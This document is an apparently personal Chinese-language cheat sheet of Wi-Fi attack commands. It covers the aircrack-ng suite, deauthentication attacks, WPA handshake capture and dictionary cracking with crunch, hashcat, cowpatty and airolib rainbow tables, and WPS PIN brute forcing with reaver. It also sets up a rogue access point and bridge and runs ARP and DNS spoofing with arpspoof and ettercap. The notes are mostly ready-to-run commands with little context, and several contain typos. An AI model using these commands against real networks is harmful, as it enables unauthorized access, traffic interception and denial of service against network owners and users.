wifi-ceshi

---

aircrack-ng 破解WEP以及WPA（字典攻击）密钥

airdecap-ng通过已知密钥来解密WEP或WPA嗅探数据

airmon-ng将网卡设定为监听模式

aireplay-ng数据包注入工具（Linux和Windows使用CommView驱动程序）

airodump-ng数据包嗅探：将无线网络数据输送到PCAP或IVS文件并显示网络信息

airtun-ng创建虚拟管道

airolib-ng保存、管理ESSID密码列表

packetforge-ng创建数据包注入用的加密包。

Tools混合、转换工具

airbase-ng软件模拟AP

airdecloak-ng消除pcap文件中的WEP加密

airdriver-ng无线设备驱动管理工具

airolib-ng保存、管理ESSID密码列表，计算对应的密钥

airserv-ng允许不同的进程访问无线网卡

buddy-ng easside-ng的文件描述

easside-ng 和AP接入点通讯（无WEP）

tkiptun-ng WPA/TKIP攻击

wesside-ng 自动破解WEP密钥

iwconfig

wlx00367652b3c9

ifconfig  wlx00367652b3c9

00:36:76:52:b3:c9

iwconfig wlx00367652b3c9 essid "jiali"

 ifconfig wlx00367652b3c9 up
 
iwlist

ruote -n

ifconfig wlx00367652b3c9 192.168.2.130 netmask 255.255.255.0

 airmon-ng  aircrack-ng
 
iwconfig  wlx00367652b3c9 channel 11

aireplay-ng -0 5 -a <mac> --ignore-negative wlx00367652b3c9 

 aircrack-ng 工具套件 -- airmon-ng ， aireplay-ng ， airodump-ng ， aircrack-ng

airodump-ng wlx00367652b3c9

airodump-ng –bssid 00:21:91:D2:8E:25 --channel 11 --write WEPCrackingDemo wlx00367652b3c9

airodump-ng –-bssid 14:75:90:57:F1:46 -–channel 11 –-write WPACrackingDemo wlx00367652b3c9

14:75:90:57:F1:46 jiali

airepaly-ng --deauth 1 -a  14:75:90:57:F1:46  wlx00367652b3c9  –-ignore-negative-one

tshark -r xx.cap

 airbase-ng  --essid jiali2 -c 11 wlx00367652b3c9


ifconfig eth0 0.0.0.0 up 

ifconfig ath0 0.0.0.0 up

网络桥接

echo 1 > /proc/sys/net/ipv4/ip_forward ip转发

brctl addbr mitm-bridge

 brctl addif mitm-bridge 
 
eth0 brctl addif mitm-bridge 

at0 ifconfig eth0 0.0.0.0 up

ifconfig at0 0.0.0.0 up


Wifite

aireplay-ng  -0 5  -a 14:75:90:57:F1:46 40:EC:99:D0:AA:E8 wlan0

aireplay-ng -0 5  -a 14:75:90:57:F1:46 -c 40:EC:99:D0:AA:E8 wlan0 

airodump-ng  -w /root/wpa-1 -c 1  wlan0 --ignore-negative-one   

airodump-ng  -w /root/wpa-1 -c 1  wlan0 --ignore-negative-one    检测
aircrack-ng -w testpass  /root/wpa-1-01.cap    破解
aireplay-ng -0 5  -a 14:75:90:57:F1:46 -c 40:EC:99:D0:AA:E8  wlan0 弹出网络

crunch

crunch 9 9 pass2 | aircrack-ng /root/wpa-1-01.cap -e jiali -w -

跑包

aircrack-ng /root/wpa-1-01.cap  -J /root/wpahashcap
hashcat
hashcat -m 2500 /root/wpahashcap.hccap /root/testpass 

cowpatty -f /root/testpass  -r /root/wpa-1-01.cap  -s jiali     

genpmk -f

wifite --dict /root/testpass  自动破解

彩虹表加速

li:~# airolib-ng RAINBOW_2 --import essid /root/essid 

 airolib-ng RAINBOW_2 --import passwd /root/testpass 
 
airolib-ng RAINBOW_2 --batch

airolib-ng RAINBOW_2 --export 

EWSA pyrit 慢慢跑

专业跑包 EWSA psk ，综合psk，pmk


云计算跑包

破解WPS

wash -i wlan0    判断wps wifite

wps，pin码破解原理

reaver命令穷举PIN码破解

-i  无线网卡名称

-b  目标AP的mac地址

-a  自动检测目标AP最佳配置

-S  使用最小的DH key，可以提高破解速度

-vv  显示更多的非严重警告（注意这是 2 个小写字母 v）

-d  即delay每穷举一次的闲置时间 预设为1秒

-c  信道编号

-p  PIN码四位或八位  //可以用8位直接找到密码。

知道pin码，改密码无用

reaver -b mac -i wlan0  -a -S -d 0 -t 1 -n -c 1

reaver -i wlan0mon -b xx:xx:xx:xx:xx:xx -vv

破解时推荐使用这个命令：reaver -i wlan0mon -b D8:15:0D:D6:13:92 -a -S -d9 -t9 -vv,因为–d9 –t9参数可以防止pin死路由器

 reaver  -i  wlan0mon -b  xx:xx:xx:xx:xx:xx  -p 12316977
 
pixiewps 破解wps，wifite 穷举

arpspoof

 cat /proc/sys/net/ipv4//ip_forward
 
arpspoof -i eth0 -t 10.1.1.3 10.1.1.254

ettercap 会话劫持，会话欺骗 抓包

毒化内网用户

ettercap dns 欺骗

无线不知道PIN： #reaver -i wlan0 -b mac地址 -vv

reaver -i wlan0 -b  FC:D7:33:99:87:E8  -a -S -d9 -t9 -vv

知道PIN ：  #reaver -i wlan0 -b FC:D7:33:99:87:E8  -P 12345670
 FC:D7:33:99:87:E8

aireplay-ng deauth攻击

aircrack-ng -w dic cap文件

freeradius

hostapd

asleap
